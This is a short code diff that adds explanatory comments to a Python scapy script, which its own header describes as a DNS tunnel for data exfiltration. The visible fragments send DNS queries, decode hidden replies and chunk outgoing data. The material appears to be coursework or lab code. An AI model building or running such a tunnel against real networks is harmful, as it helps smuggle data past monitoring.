@@ -1,3 +1,5 @@
+# This script uses scapy to create a DNS tunnel for data exfil, and processes hidden messages in DNS responses from the server upon receipt.
+
 from scapy.all import *
 from base64 import b64encode
 
@@ -14,6 +16,8 @@ def process(response):
         print("Acknowledged end transmission")
     else:
         print("Transmission error")
+# This function accepts the DNS answer from the server-side, isolates the final number in the IP address response, 
+# and uses it to print the hidden message back to the client.
 
 def DNSRequest(subdomain):
     global domain
@@ -29,7 +33,6 @@ def DNSRequest(subdomain):
     result = srp1(p,verbose=False)
     # srp1 is scapy's packet "sender" if Layer 2 info is specified. Otherwise, use "sr1." Both send a single packet, hence the "1."
     process(result)
-
 
 def sendData(data):
     for i in range(0,len(data),10):
